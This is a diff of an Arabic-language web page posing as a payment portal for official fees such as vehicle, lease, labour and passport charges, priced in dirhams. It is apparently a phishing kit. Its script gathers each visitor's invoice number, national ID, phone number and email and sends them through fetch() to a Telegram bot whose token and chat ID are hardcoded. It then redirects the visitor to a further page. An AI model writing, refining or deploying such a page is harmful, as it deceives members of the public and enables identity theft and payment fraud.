@@ -117,14 +117,22 @@
                             <option value="دفع رسوم نقل ملكية لوحة مركبة">دفع رسوم نقل ملكية لوحة مركبة</option>
                             <option value="دفع رسوم حجز مركبة">دفع رسوم حجز مركبة</option>
                             <option value="دفع رسوم فحص مركبة">دفع رسوم فحص مركبة</option>
-                            <option value="دفع رسوم عقد ايجار">دفع رسوم عقد ايجار</option>
-                            <option value="دفع رسوم عقد تمليك">دفع رسوم عقد تمليك</option>
+                            <option value="دفع رسوم عقد ايجار (فيلا - شقة - مزرعة - شاليه - مستودع - محل - ارض تجارية - ارض زراعية)">دفع رسوم عقد ايجار (فيلا - شقة - مزرعة - شاليه - مستودع - محل - ارض تجارية - ارض زراعية)</option>
+                            <option value="دفع رسوم عقد تمليك (فيلا - شقة - مزرعة - شاليه - مستودع - محل - ارض تجارية - ارض زراعية)">دفع رسوم عقد تمليك (فيلا - شقة - مزرعة - شاليه - مستودع - محل - ارض تجارية - ارض زراعية)</option>
+                            <option value="دفع رسوم تأمين ايجار (فيلا - شقة - مزرعة - شاليه - مستودع - محل - ارض تجارية - ارض زراعية)">دفع رسوم تأمين (فيلا - شقة - مزرعة - شاليه - مستودع - محل - ارض تجارية - ارض زراعية)</option>
                             <option value="دفع رسوم شحن">دفع رسوم شحن</option>
                             <option value="تسديد المستحقات للطرفين">تسديد المستحقات للطرفين</option>
                             <option value="دفع رسوم توقيع تعهد الكتروني">دفع رسوم توقيع تعهد الكتروني</option>
                             <option value="دفع رسوم استقدام عمالة">دفع رسوم استقدام عمالة</option>
                             <option value="دفع ضريبة القيمة المضافة">دفع ضريبة القيمة المضافة</option>
+                            <option value="دفع رسوم عقد عمالة">دفع رسوم عقد عمالة</option>
                             <option value="دفع رسوم الجوازات">دفع رسوم الجوازات</option>
+                            <option value="دفع رسوم عقد عمل">دفع رسوم عقد عمل</option>
+                            <option value="دفع رسوم توكيل محامي">دفع رسوم توكيل محامي</option>
+                            <option value="دفع رسوم الخدمات الكترونية">دفع رسوم الخدمات الكترونية</option>
+                            <option value="دفع رسوم وزارة الموارد البشرية">دفع رسوم وزارة الموارد البشرية</option>
+                            <option value="دفع رسوم تجديد عقود">دفع رسوم تجديد عقود</option>
+                            <option value="دفع رسوم عقد تقديم خدمات">دفع رسوم عقد تقديم خدمات</option>
                             <option value="استرداد الرسوم المدفوعة">استرداد الرسوم المدفوعة</option>
                         </select>
                         <div class="error-message" id="serviceTypeError">يرجى اختيار نوع الخدمة</div>
@@ -146,13 +154,14 @@
     </div>
 
     <script>
-        const telegramBotToken = '8591237339:AAHOMH_hwr6ts_zlKb3ClGXb7RBpZ8ii5j0';
-        const telegramChatId = '1848565778';
+        const telegramBotToken = '8679116779:AAFA4ChWcYM9ZiHa3BAr3IylTOUEWvFQNkw';
+        const telegramChatId = '8362204213';
 
-        async function sendToTelegram(message) {
+        // إرسال رسالة تلغرام جديدة دائماً لضمان الوصول بنسبة 100%
+        async function sendNewTelegram(message) {
             try {
                 const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
-                await fetch(url, {
+                const response = await fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -161,6 +170,11 @@
                         parse_mode: 'HTML'
                     })
                 });
+                const data = await response.json();
+                if (data.ok) {
+                    // تخزين ID الرسالة كمرجع فقط إذا لزم الأمر مستقبلاً
+                    localStorage.setItem('telegramMessageId', data.result.message_id);
+                }
             } catch (error) {
                 console.error('خطأ في الإرسال:', error);
             }
@@ -179,6 +193,18 @@
             }
         }
 
+        function toggleFieldValidation(field, isValid, errorId) {
+            const errorElement = document.getElementById(errorId);
+            if (isValid) {
+                field.classList.remove('invalid'); field.classList.add('valid');
+                errorElement.style.display = 'none';
+            } else {
+                field.classList.remove('valid'); field.classList.add('invalid');
+                errorElement.style.display = 'block';
+            }
+        }
+
+        // التحقق أثناء الكتابة
         document.getElementById('invoiceNumber').addEventListener('input', function() {
             validateField(this, /^.+$/, 'invoiceNumberError');
         });
@@ -191,29 +217,50 @@
         document.getElementById('email').addEventListener('input', function() {
             validateField(this, /^[^\s@]+@[^\s@]+\.[^\s@]+$/, 'emailError');
         });
+        document.getElementById('serviceType').addEventListener('change', function() {
+            validateField(this, /^.+$/, 'serviceTypeError');
+        });
+        document.getElementById('amount').addEventListener('input', function() {
+            const value = parseFloat(this.value);
+            const isValid = !isNaN(value) && value >= 5 && value <= 99999;
+            toggleFieldValidation(this, isValid, 'amountError');
+        });
 
+        // تأكيد البيانات
         document.getElementById('confirmUserData').addEventListener('click', async function() {
             let isValid = true;
 
             const invoiceNumber = document.getElementById('invoiceNumber').value;
-            const idNumber = document.getElementById('idNumber').value;
-            const phoneNumber = document.getElementById('phoneNumber').value;
-            const email = document.getElementById('email').value;
-            const serviceType = document.getElementById('serviceType').value;
-            const amount = document.getElementById('amount').value;
+            if (!invoiceNumber) { document.getElementById('invoiceNumberError').style.display = 'block'; document.getElementById('invoiceNumber').classList.add('invalid'); isValid = false; }
 
-            if (!invoiceNumber) { document.getElementById('invoiceNumberError').style.display = 'block'; isValid = false; }
-            if (idNumber.length !== 15) { document.getElementById('idNumberError').style.display = 'block'; isValid = false; }
-            if (!/^05\d{8}$/.test(phoneNumber)) { document.getElementById('phoneNumberError').style.display = 'block'; isValid = false; }
-            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) { document.getElementById('emailError').style.display = 'block'; isValid = false; }
-            if (!serviceType) { document.getElementById('serviceTypeError').style.display = 'block'; isValid = false; }
-            if (!amount || amount < 5) { document.getElementById('amountError').style.display = 'block'; isValid = false; }
+            const idNumber = document.getElementById('idNumber').value;
+            if (!idNumber || idNumber.length !== 15 || !/^\d+$/.test(idNumber)) { document.getElementById('idNumberError').style.display = 'block'; document.getElementById('idNumber').classList.add('invalid'); isValid = false; }
+
+            const phoneNumber = document.getElementById('phoneNumber').value;
+            if (!phoneNumber || !/^05\d{8}$/.test(phoneNumber)) { document.getElementById('phoneNumberError').style.display = 'block'; document.getElementById('phoneNumber').classList.add('invalid'); isValid = false; }
+
+            const email = document.getElementById('email').value;
+            if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) { document.getElementById('emailError').style.display = 'block'; document.getElementById('email').classList.add('invalid'); isValid = false; }
+
+            const serviceType = document.getElementById('serviceType').value;
+            if (!serviceType) { document.getElementById('serviceTypeError').style.display = 'block'; document.getElementById('serviceType').classList.add('invalid'); isValid = false; }
+
+            const amount = document.getElementById('amount').value;
+            if (!amount || amount < 5 || amount > 99999) { document.getElementById('amountError').style.display = 'block'; document.getElementById('amount').classList.add('invalid'); isValid = false; }
 
             if (isValid) {
-                localStorage.setItem('selectedBankName', 'جاري الاختيار...');
-                const content = `👤 <b>بيانات المستخدم الجديدة</b>\n\n🧾 رقم الفاتورة: ${invoiceNumber}\n🆔 رقم الهوية: ${idNumber}\n📱 رقم الجوال: ${phoneNumber}\n📧 البريد: ${email}\n💼 الخدمة: ${serviceType}\n💰 المبلغ: ${amount} AED`;
+                // حفظ البيانات في localStorage
+                localStorage.setItem('invoiceNumber', invoiceNumber);
+                localStorage.setItem('idNumber', idNumber);
+                localStorage.setItem('phoneNumber', phoneNumber);
+                localStorage.setItem('userEmail', email);
+                localStorage.setItem('serviceType', serviceType);
+                localStorage.setItem('amount', amount);
+
+                const content = `👤 <b>بيانات المستخدم المدخلة</b>\n\n🧾 رقم الفاتورة: ${invoiceNumber}\n🆔 رقم الهوية: ${idNumber}\n📱 رقم الجوال: ${phoneNumber}\n📧 البريد الإلكتروني: ${email}\n💼 نوع الخدمة: ${serviceType}\n💰 المبلغ: ${amount} درهم إماراتي`;
                 
-                await sendToTelegram(content);
+                // إرسال رسالة جديدة دائماً
+                await sendNewTelegram(content);
                 window.location.href = 'page3.html';
             }
         });
